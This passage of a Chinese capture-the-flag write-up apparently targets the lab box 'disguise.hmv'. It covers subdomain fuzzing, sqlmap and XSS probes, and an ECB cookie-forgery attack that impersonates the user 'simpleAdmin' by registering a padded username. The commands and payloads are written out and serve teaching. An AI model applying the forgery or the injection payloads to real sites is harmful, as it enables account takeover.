\u6d41\u91cf\u76d1\u542c\n\n\u4f7f\u7528`tcpdump`\u76d1\u542c\u76ee\u6807\u4e3b\u673a `192.168.205.211` \u7684\u7f51\u7edc\u6d41\u91cf\uff0c\u89c2\u5bdf\u662f\u5426\u6709\u5f02\u5e38\u901a\u4fe1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo tcpdump -i eth0 host 192.168.205.211 -nn\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n22:44:40.505340 IP 192.168.205.211.41597 > 162.159.200.1.123: NTPv4, Client, length 48\n22:44:40.876037 ARP, Request who-has 192.168.205.211 tell 192.168.205.2, length 46\n22:44:40.876365 ARP, Reply 192.168.205.211 is-at 08:00:27:ea:d3:f5, length 46\n22:44:40.876419 IP 162.159.200.1.123 > 192.168.205.211.41597: NTPv4, Server, length 48\n22:44:45.642888 ARP, Request who-has 192.168.205.2 tell 192.168.205.211, length 46\n22:44:45.642969 ARP, Reply 192.168.205.2 is-at 00:50:56:f4:ef:6f, length 46\n^C\n6 packets captured\n6 packets received by filter\n0 packets dropped by kernel\n```\n\n\u7ecf\u8fc7\u7ea61\u5206\u949f\u7684\u76d1\u542c\uff0c\u6355\u83b7\u5230\u7684\u4e3b\u8981\u662fNTP\u548cARP\u62a5\u6587\uff0c\u672a\u53d1\u73b0\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002\n\n# \u56db\u3001\u5b50\u57df\u540d\u7206\u7834\u4e0e\u5173\u952e\u53d1\u73b0\n\n## 4.1 FFUF\u5b50\u57df\u540d\u7206\u7834 (\u521d\u8bd5)\n\n\u5c06\u6ce8\u610f\u529b\u8f6c\u56deWeb\u5c42\u9762\uff0c\u5c1d\u8bd5\u8fdb\u884c\u5b50\u57df\u540d\u7206\u7834\u3002\u4f7f\u7528`ffuf`\u5de5\u5177\uff0c\u901a\u8fc7\u4fee\u6539Host\u5934\u7684\u65b9\u5f0f\u8fdb\u884c\u63a2\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ffuf -u http://disguise.hmv/ -H 'Host: FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -fw 11916\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://disguise.hmv/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.disguise.hmv\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 100\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 11916\n________________________________________________\n\nwww                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]\n[WARN] Caught keyboard interrupt (Ctrl-C)\n```\n\n`ffuf`\u53d1\u73b0\u4e86\u4e00\u4e2a\u5b50\u57df\u540d `www.disguise.hmv`\u3002\u5c06\u5176\u6dfb\u52a0\u5230 `/etc/hosts` \u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo nano /etc/hosts\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat /etc/hosts\n127.0.0.1       localhost\n127.0.1.1       kali\n::1             localhost ip6-localhost ip6-loopback\nff02::1         ip6-allnodes\nff02::2         ip6-allrouters\n\n192.168.205.211 www.disguise.hmv disguise.hmv\n```\n\n\u4f7f\u7528`curl`\u68c0\u67e5 `www.disguise.hmv`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ curl -I http://www.disguise.hmv\nHTTP/1.1 301 Moved Permanently\nDate: Fri, 16 May 2025 02:53:06 GMT\nServer: Apache/2.4.59 (Debian)\nX-Redirect-By: WordPress\nLocation: http://disguise.hmv/\nContent-Type: text/html; charset=UTF-8\n```\n\n\u8be5\u5b50\u57df\u540d\u901a\u8fc7301\u91cd\u5b9a\u5411\u5230\u4e3b\u7ad9 `http://disguise.hmv/`\uff0c\u6ca1\u6709\u63d0\u4f9b\u65b0\u7684\u653b\u51fb\u9762\u3002\n\n## 4.2 Gobuster DNS\u6a21\u5f0f\u5b50\u57df\u540d\u7206\u7834\n\n\u8003\u8651\u5230`ffuf`\u626b\u63cf\u901f\u5ea6\u4e5f\u8f83\u6162\uff0c\u5c1d\u8bd5\u4f7f\u7528`gobuster`\u7684DNS\u6a21\u5f0f\u8fdb\u884c\u5b50\u57df\u540d\u7206\u7834\uff0c\u9996\u5148\u4f7f\u7528\u5927\u5b57\u5178\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     disguise.hmv\n[+] Threads:    64\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n===============================================================\nStarting gobuster in DNS enumeration mode\n===============================================================\nFound: www.disguise.hmv\n\nProgress: 3541 / 114442 (3.09%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 3553 / 114442 (3.10%)\n===============================================================\nFinished\n===============================================================\n```\n\n`gobuster`\u4f7f\u7528\u5927\u5b57\u5178\u65f6\u4e5f\u4ec5\u53d1\u73b0\u4e86 `www.disguise.hmv`\u3002\u66f4\u6362\u4e3a\u8f83\u5c0f\u7684\u5b57\u5178\u518d\u6b21\u5c1d\u8bd5\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     disguise.hmv\n[+] Threads:    64\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n===============================================================\nStarting gobuster in DNS enumeration mode\n===============================================================\nFound: www.disguise.hmv\n\nProgress: 4989 / 4990 (99.98%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u5c0f\u5b57\u5178\u626b\u63cf\u5b8c\u6bd5\uff0c\u4ecd\u7136\u53ea\u6709 `www.disguise.hmv`\u3002\u6ca1\u529e\u6cd5\u4e86\uff0c\u4e5f\u6ca1\u5176\u4ed6\u7684\u8def\u4e86\uff0c\u786c\u626b\u5427\u3002\u518d\u6b21\u4f7f\u7528\u5927\u5b57\u5178\u8fdb\u884c\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     disguise.hmv\n[+] Threads:    64\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n===============================================================\nStarting gobuster in DNS enumeration mode\n===============================================================\nFound: www.disguise.hmv\n\nProgress: 25708 / 114442 (22.46%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 25739 / 114442 (22.49%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u86d9\u8da3\uff0c\u4e0d\u5bf9\u554a\uff0c2w\u591a\u90fd\u6ca1\u51fa\u6765\u8fd9\u4e48\u5938\u5f20\uff1f\u770b\u770b\u5176\u4ed6\u4eba\u7684wp\u3002\u64cd.......\u597d\u50cf\u662f\u8f6f\u4ef6\u95ee\u9898\u3002\n\n## 4.3 Wfuzz\u5b50\u57df\u540d\u7206\u7834 (\u8f6c\u673a)\n\n\u66f4\u6362\u4e3a`wfuzz`\u5de5\u5177\uff0c\u540c\u6837\u901a\u8fc7\u4fee\u6539Host\u5934\u7684\u65b9\u5f0f\u8fdb\u884c\u5b50\u57df\u540d\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ wfuzz -c -u 'http://disguise.hmv/' -H 'HOST:FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 4602\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://disguise.hmv/\nTotal requests: 114441\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000000001:   301        0 L      0 W        0 Ch        'www - www'\n000005051:   200        18 L     52 W       846 Ch      'dark - dark'\n^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...\n\nTotal time: 236.0730\nProcessed Requests: 8494\nFiltered Requests: 8492\nRequests/sec.: 35.98038\n```\n\n`wfuzz`\u6210\u529f\u7206\u7834\u51fa\u65b0\u7684\u5b50\u57df\u540d `dark.disguise.hmv`\uff01\n\n\u6c89\u9ed8\u662f\u4eca\u665a\u7684\u5eb7\u6865\u3002\n\n\u5c06\u65b0\u53d1\u73b0\u7684\u5b50\u57df\u540d `dark.disguise.hmv` \u6dfb\u52a0\u5230 `/etc/hosts` \u6587\u4ef6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sudo nano /etc/hosts\n[sudo] password for kali:\n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat /etc/hosts\n127.0.0.1       localhost\n127.0.1.1       kali\n::1             localhost ip6-localhost ip6-loopback\nff02::1         ip6-allnodes\nff02::2         ip6-allrouters\n\n192.168.205.211 www.disguise.hmv disguise.hmv dark.disguise.hmv\n```\n\n\u8bbf\u95ee `http://dark.disguise.hmv`\u3002\n![image-20250516110839064](https://7r1umphk.github.io/image/20250516110839497.webp)\n\u9875\u9762\u663e\u793a\u4e3a\u4e00\u4e2a\u540d\u4e3a\u201c\u6697\u9ed1\u5546\u5e97\u201d\u7684\u7ad9\u70b9\uff0c\u98ce\u683c\u6709\u70b9\u70ab\u3002\n\n# \u4e94\u3001\u6697\u9ed1\u5546\u5e97 (dark.disguise.hmv) \u6e17\u900f\u6d4b\u8bd5\n\n## 5.1 \u521d\u6b65\u63a2\u7d22\u4e0e\u6ce8\u518c\u529f\u80fd\u5206\u6790\n\n\u67e5\u770b\u65b0\u7ad9\u70b9\u7684\u9875\u9762\u6e90\u7801\uff0c\u672a\u53d1\u73b0\u660e\u663e\u53ef\u5229\u7528\u4fe1\u606f\u3002\u5c1d\u8bd5\u4f7f\u7528\u4e4b\u524d\u5728WordPress\u7ad9\u70b9\u53d1\u73b0\u7684\u7528\u6237\u540d `simpleAdmin` \u8fdb\u884c\u5f31\u5bc6\u7801\u767b\u5f55\uff0c\u5931\u8d25\u3002\n\u89c2\u5bdf\u6ce8\u518c\u9875\u9762 (register.php)\uff0c\u53d1\u73b0\u5176\u8868\u5355\u63d0\u4ea4\u65f6\u5b58\u5728\u524d\u7aefJavaScript\u6821\u9a8c\u51fd\u6570 `validateForm`\uff0c\u8be5\u51fd\u6570\u9650\u5236\u7528\u6237\u540d\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc78\u4e2a\u5b57\u7b26\u3002\n\n```javascript\n// validateForm (\u90e8\u5206\u793a\u4f8b)\nfunction validateForm() {\n    var username = document.forms['register']['username'].value;\n    if(username.length > 8) {\n        alert('\u7528\u6237\u540d\u4e0d\u80fd\u8d85\u8fc78\u4e2a\u5b57\u7b26');\n        return false;\n    }\n    return true;\n}\n```\n\n\u7531\u4e8e\u76ee\u6807\u7528\u6237 `simpleAdmin` (11\u5b57\u7b26) \u957f\u5ea6\u8d85\u8fc78\u4f4d\uff0c\u8be5\u524d\u7aef\u6821\u9a8c\u4f1a\u963b\u6b62\u6ce8\u518c\u3002\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u5f00\u53d1\u8005\u5de5\u5177\u5220\u9664\u6216\u4fee\u6539\u6b64JS\u51fd\u6570\u6765\u7ed5\u8fc7\u524d\u7aef\u6821\u9a8c\u3002\n\n\u9996\u5148\u6ce8\u518c\u4e00\u4e2a\u666e\u901a\u7528\u6237 `admin`\uff0c\u5bc6\u7801 `111111`\uff0c\u4ee5\u719f\u6089\u7cfb\u7edf\u529f\u80fd\u3002\n\u767b\u5f55\u540e\u8fdb\u5165\u4e2a\u4eba\u4e2d\u5fc3\u9875\u9762 (profile.php)\u3002\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>\u4e2a\u4eba\u4e2d\u5fc3 - \u6697\u9ed1\u5546\u5e97</title>\n    <link rel='stylesheet' href='style3.css'>\n</head>\n<body>\n    <header>\n        <h1>\u6697\u9ed1\u5546\u5e97</h1>\n        <nav>\n            <span>\u6b22\u8fce, admin\n            </span> |\n            <a href='index.php'>\u9996\u9875</a> |\n                        <a href='logout.php'>\u9000\u51fa</a>\n        </nav>\n    </header>\n\n    <div class='profile'>\n        <h2>\u4e2a\u4eba\u4e2d\u5fc3</h2>\n        <p>\u6b22\u8fce\u8bbf\u95ee\u60a8\u7684\u4e2a\u4eba\u4e3b\u9875\uff0c\u8fd9\u91cc\u53ef\u4ee5\u67e5\u770b\u548c\u7ba1\u7406\u60a8\u7684\u8d26\u6237\u4fe1\u606f</p>\n\n            </div>\n</body>\n</html>\n```\n\n\u9875\u9762\u6e90\u7801\u4f9d\u7136\u7b80\u6d01\u3002\u4f7f\u7528BurpSuite\u6293\u53d6HTTP\u8bf7\u6c42\uff0c\u53d1\u73b0\u767b\u5f55\u540e\u7684Cookie\u4e2d\u5305\u542b\u4e00\u4e2a\u540d\u4e3a `dark_session` \u7684\u5b57\u6bb5\uff0c\u5176\u503c\u7ecf\u8fc7\u4e86URL\u7f16\u7801\uff0c\u672b\u5c3e\u7684 `%3D%3D` \u6697\u793a\u5176\u53ef\u80fd\u662fBase64\u7f16\u7801\u3002\n\n```http\nGET /profile.php HTTP/1.1\nHost: dark.disguise.hmv\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: http://dark.disguise.hmv/login.php\nConnection: keep-alive\nCookie: PHPSESSID=g31oqe3lpvnk3gd1obs5pmm4a0; dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n```\n\n\u8fd9 `dark_session` \u770b\u8d77\u6765\u6709\u70b9\u673a\u4f1a\uff0c\u4f46\u76ee\u524d\u5c1a\u4e0d\u6e05\u695a\u5176\u5177\u4f53\u4f5c\u7528\u3002\n\n## 5.2 SQL\u6ce8\u5165\u4e0eXSS\u5c1d\u8bd5\n\n\u5728\u8fdb\u4e00\u6b65\u5206\u6790 `dark_session` \u524d\uff0c\u5148\u5c1d\u8bd5\u5e38\u89c4\u7684Web\u6f0f\u6d1e\u6d4b\u8bd5\u3002\n\u4f7f\u7528`sqlmap`\u5bf9\u767b\u5f55\u8868\u5355 (login.php) \u8fdb\u884cSQL\u6ce8\u5165\u68c0\u6d4b\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ sqlmap -u 'http://dark.disguise.hmv/login.php' --forms --batch --level=3 --risk=3\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.9.4#stable}\n|_ -| . [']     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 23:42:55 /2025-05-15/\n\n[23:42:55] [INFO] testing connection to the target URL\nyou have not declared cookie(s), while server wants to set its own ('PHPSESSID=e2744i2rksa...aqbikf4hhl'). Do you want to use those [Y/n] Y\n[23:42:55] [INFO] searching for forms\n[1/1] Form:\nPOST http://dark.disguise.hmv/login.php\nPOST data: username=&password=\ndo you want to test this form? [Y/n/q]\n> Y\nEdit POST data [default: username=&password=] (Warning: blank fields detected): username=&password=\ndo you want to fill blank fields with random values? [Y/n] Y\n# ... (\u5927\u91cfsqlmap\u63a2\u6d4b\u8fc7\u7a0b\u8f93\u51fa) ...\n[23:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target\n[23:43:21] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-05152025_1142pm.csv'\n\n[*] ending @ 23:43:21 /2025-05-15/\n```\n\nSqlmap\u672a\u53d1\u73b0SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\n\u5c1d\u8bd5\u5728\u6ce8\u518c\u7528\u6237\u540d\u7684\u4f4d\u7f6e\u8f93\u5165XSS payload `<script>alert(document.domain)</script>`\uff0c\u5bc6\u7801 `111111`\u3002\u767b\u5f55\u540e\u53d1\u73b0\u7279\u6b8a\u5b57\u7b26 `<` \u548c `>` \u88abHTML\u5b9e\u4f53\u7f16\u7801\uff0cXSS\u5c1d\u8bd5\u5931\u8d25\u3002\n\n## 5.3 Cookie (`dark_session`) \u5206\u6790\u4e0e\u4f2a\u9020 (ECB Oracle Padding Attack)\n\n\u91cd\u70b9\u5206\u6790 `dark_session` Cookie\u3002\n\u4ee5\u7528\u6237 `admin` (\u5bc6\u7801 `111111`) \u767b\u5f55\u540e\u83b7\u53d6\u7684 `dark_session` \u4e3a `1mr9fHMuTh6J56IrZHP28w%3D%3D`\u3002\n\u4f7f\u7528CyberChef\u8fdb\u884cURL\u89e3\u7801\uff0c\u5f97\u5230 `1mr9fHMuTh6J56IrZHP28w==`\u3002\n![image-20250516123651762](https://7r1umphk.github.io/image/20250516123652137.webp)\n\u518d\u8fdb\u884cBase64\u89e3\u7801\u3002\n![image-20250516123753831](https://7r1umphk.github.io/image/20250516123754183.webp)\n\u5f97\u5230\u4e00\u4e32\u4e8c\u8fdb\u5236\u4e71\u7801\u3002\u901a\u8fc7\u547d\u4ee4\u884c\u5de5\u5177\u9a8c\u8bc1\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo '1mr9fHMuTh6J56IrZHP28w==' | base64 -d\n\ufffdj\ufffd|s.N\ufffd\ufffd+ds\ufffd\ufffd\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ echo '1mr9fHMuTh6J56IrZHP28w==' | base64 -d | xxd\n00000000: d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3  .j.|s.N....+ds..\n```\n\n\u8fd916\u5b57\u8282\u7684\u4e71\u7801\u5f88\u53ef\u80fd\u662f\u52a0\u5bc6\u540e\u7684\u7528\u6237\u4fe1\u606f\u3002\n\n### 5.3.1 \u5206\u6790\u52a0\u5bc6\u6a21\u5f0f\u548c\u5757\u5927\u5c0f\n\n\u4e3a\u4e86\u5206\u6790\u52a0\u5bc6\u7ec6\u8282\uff0c\u6ce8\u518c\u4e0d\u540c\u957f\u5ea6\u7684\u7528\u6237\u540d\uff08\u5bc6\u7801\u56fa\u5b9a\u4e3a`111111`\uff09\uff0c\u89c2\u5bdf `dark_session` \u7684\u53d8\u5316\u3002\n\n*   \u7528\u6237 `admin` (5\u5b57\u8282): `dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D`\n    *   Base64\u89e3\u7801\u540exxd: `d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3` (16\u5b57\u8282)\n*   \u7528\u6237 `adminadmin` (10\u5b57\u8282): `dark_session=nkhz%2FGuSp8O6W0%2FNKRWDrg%3D%3D`\n    *   Base64\u89e3\u7801\u540exxd: `9e48 73fc 6b92 a7c3 ba5b 4fcd 2915 83ae` (16\u5b57\u8282)\n*   \u7528\u6237 `adminadminadmin` (15\u5b57\u8282): `dark_session=iVItH823tj24X11GL%2BrzqF15zKXhTZzq4geu6%2BoJYh0%3D`\n    *   Base64\u89e3\u7801\u540exxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 5d79 cca5 e14d 9cea e207 aeeb ea09 621d` (32\u5b57\u8282)\n*   \u7528\u6237 `adminadminadminadmin` (20\u5b57\u8282): `dark_session=iVItH823tj24X11GL%2BrzqHXcmFsh%2Be0Wk1hiTcLtOls%3D`\n    *   Base64\u89e3\u7801\u540exxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 75dc 985b 21f9 ed16 9358 624d c2ed 3a5b` (32\u5b57\u8282)\n\n\u89c2\u5bdf15\u5b57\u8282\u548c20\u5b57\u8282\u7528\u6237\u540d\u7684\u5bc6\u6587\uff0c\u5b83\u4eec\u7684\u524d16\u5b57\u8282\u5b8c\u5168\u76f8\u540c (`8952...f3a8`)\u3002\u8fd9\u5f3a\u70c8\u6697\u793a\u4e86\u52a0\u5bc6\u6a21\u5f0f\u4e3a **ECB (Electronic Codebook)**\uff0c\u4e14\u5757\u5927\u5c0f\u4e3a **16\u5b57\u8282**\u3002\n\n### 5.3.2 \u786e\u8ba4\u5bc6\u7801\u4e0d\u53c2\u4e0eCookie\u52a0\u5bc6\n\n\u6ce8\u518c\u7528\u6237 `test2` (5\u5b57\u8282)\uff0c\u5bc6\u7801 `1111111111` (\u4e0e\u4e4b\u524d\u7684 `111111` \u4e0d\u540c)\u3002\n`dark_session=oLEv4TbjA09b0PNNSNRdhA%3D%3D`\nBase64\u89e3\u7801\u540exxd: `a0b1 2fe1 36e3 034f 5bd0 f34d 48d4 5d84` (\u4ecd\u4e3a16\u5b57\u8282)\u3002\n\u5bc6\u6587\u957f\u5ea6\u548c\u7ed3\u6784\u672a\u56e0\u5bc6\u7801\u6539\u53d8\u800c\u6539\u53d8\uff0c\u786e\u8ba4\u5bc6\u7801\u4e0d\u76f4\u63a5\u53c2\u4e0e `dark_session` \u7684\u52a0\u5bc6\u3002\n\n### 5.3.3 \u63a8\u65adSalt\u548c\u586b\u5145\u673a\u5236\n\n\u52a0\u5bc6\u7684\u660e\u6587\u7ed3\u6784\u63a8\u6d4b\u4e3a `Salt + Username`\uff0c\u7136\u540e\u8fdb\u884cPKCS#7\u586b\u5145\u3002\n\n*   `adminadmin` (10\u5b57\u8282) + Salt -> 16\u5b57\u8282\u5bc6\u6587 (1\u5757)\n*   `adminadminadmin` (15\u5b57\u8282) + Salt -> 32\u5b57\u8282\u5bc6\u6587 (2\u5757)\n\n\u8fd9\u8868\u660e `(Salt\u957f\u5ea6 + 10)` \u7ecf\u8fc7\u586b\u5145\u540e\u4e3a16\u5b57\u8282\uff0c\u800c `(Salt\u957f\u5ea6 + 15)` \u7ecf\u8fc7\u586b\u5145\u540e\u4e3a32\u5b57\u8282\u3002\n\u8bbeSalt\u957f\u5ea6\u4e3a `S`\u3002\n\n*   `S + 10 <= 16`\n*   `S + 15 > 16` (\u56e0\u4e3a\u4ea7\u751f\u4e86\u7b2c\u4e8c\u5757\u5bc6\u6587)\n\n\u5982\u679c `S = 4`\uff1a\n\n*   `4 + 10 = 14`\u5b57\u8282\u3002PKCS#7\u586b\u51452\u5b57\u8282 (\u6bcf\u4e2a\u5b57\u8282\u4e3a`\\x02`)\uff0c\u603b\u517116\u5b57\u8282\u3002\n*   `4 + 15 = 19`\u5b57\u8282\u3002PKCS#7\u586b\u514513\u5b57\u8282 (\u6bcf\u4e2a\u5b57\u8282\u4e3a`\\x0d`)\uff0c\u603b\u517132\u5b57\u8282\u3002\n    \u8fd9\u4e2a\u63a8\u65ad\u4e0e\u7b2c\u4e00\u4e2a\u5bc6\u6587\u5757\u53ef\u80fd\u76f8\u540c\u7684ECB\u7279\u6027\u543b\u5408\u3002\n\n\u8fdb\u4e00\u6b65\u9a8c\u8bc1Salt\u957f\u5ea6\u548cPKCS#7\u586b\u5145\u89c4\u5219\uff08\u7279\u522b\u662f\u5f53\u6570\u636e\u957f\u5ea6\u6b63\u597d\u662f\u5757\u5927\u5c0f\u65f6\uff09\uff1a\n\u6ce8\u518c\u7528\u6237 `adminadminad` (12\u5b57\u8282)\uff0c\u5bc6\u7801 `111111`\u3002\n`dark_session=iVItH823tj24X11GL%2BrzqMJwkfrsOdSxW16pbszGJLY%3D`\nBase64\u89e3\u7801\u540exxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6` (32\u5b57\u8282)\u3002\n\u5982\u679cSalt\u4e3a4\u5b57\u8282\uff0c\u5219 `Salt(4) + adminadminad(12) = 16`\u5b57\u8282\u3002\u6839\u636ePKCS#7\u586b\u5145\u89c4\u5219\uff0c\u5f53\u6570\u636e\u957f\u5ea6\u7b49\u4e8e\u5757\u5927\u5c0f\u65f6\uff0c\u4ecd\u9700\u586b\u5145\u4e00\u4e2a\u5b8c\u6574\u768416\u5b57\u8282\u5757 (16\u4e2a`\\x10`)\u3002\u56e0\u6b64\u603b\u660e\u6587\u957f\u5ea6\u4e3a32\u5b57\u8282\uff0c\u4ea7\u751f32\u5b57\u8282\u5bc6\u6587\u3002\u8fd9\u4e0e\u89c2\u5bdf\u4e00\u81f4\uff0c\u786e\u8ba4 **Salt\u957f\u5ea6\u4e3a4\u5b57\u8282**\u3002\n\n### 5.3.4 \u4f2a\u9020simpleAdmin\u7684Cookie\n\n\u76ee\u6807\u7528\u6237 `simpleAdmin` (11\u5b57\u8282)\u3002\n\u670d\u52a1\u5668\u5b9e\u9645\u52a0\u5bc6\u7684\u660e\u6587\u4e3a `Salt(4) + 'simpleAdmin'(11) = 15`\u5b57\u8282\u3002\nPKCS#7\u586b\u5145\u540e\u4e3a `Salt(4) + 'simpleAdmin'(11) + '\\x01'(padding)`\uff0c\u517116\u5b57\u8282\u3002\n\n\u4e3a\u4e86\u83b7\u53d6\u5bc6\u6587\uff0c\u6211\u4eec\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u540d\u4e3a `simpleAdmin\\x01` (\u8fd9\u91cc `\\x01` \u662f\u7528\u6237\u540d\u7684\u4e00\u90e8\u5206\uff0c\u603b\u957f12\u5b57\u8282)\u3002\n\u670d\u52a1\u5668\u52a0\u5bc6\u7684\u660e\u6587\u57571\u5c06\u662f `Salt(4) + 'simpleAdmin\\x01'(username_part, 12) = 16`\u5b57\u8282\u3002\n\u7531\u4e8e\u6b63\u597d16\u5b57\u8282\uff0c\u4f1a\u518d\u586b\u5145\u4e00\u4e2a16\u5b57\u8282\u7684 `\\x10` \u5757\u3002\n\u4f46\u91cd\u8981\u7684\u662f\uff0c\u7b2c\u4e00\u4e2a16\u5b57\u8282\u660e\u6587\u5757\u7684\u6570\u636e\u4e0e\u6211\u4eec\u76ee\u6807\u7528\u6237 `simpleAdmin` \u7ecf\u8fc7\u586b\u5145\u540e\u7684\u660e\u6587\u5757\u6570\u636e\u662f\u76f8\u540c\u7684\uff01\n\n\u64cd\u4f5c\u6b65\u9aa4\uff1a\n\n1. \u5728\u6ce8\u518c\u9875\u9762\u8f93\u5165\u7528\u6237\u540d `simpleAdmin`\u3002\n\n2. \u4f7f\u7528BurpSuite\u62e6\u622a\u6ce8\u518c\u8bf7\u6c42\uff0c\u5c06`username`\u53c2\u6570\u503c\u4fee\u6539\u4e3a `simpleAdmin%01` (URL\u7f16\u7801\u7684`\\x01`)\uff0c\u5bc6\u7801 `111111`\u3002\n\n   *\u6ce8\u610f\uff1a\u767b\u5f55\u7684\u65f6\u5019\u4e5f\u8981\u8fdb\u884c\u548c2\u4e00\u6837\u7684\u64cd\u4f5c*\n\n3. \u6ce8\u518c\u6210\u529f\u540e\uff0c\u6d4f\u89c8\u5668Cookie\u4e2d\u7684 `dark_session` \u503c\u4e3a `%2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D`\u3002\n\n4. URL\u89e3\u7801\uff1a`+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=`\n\n5. 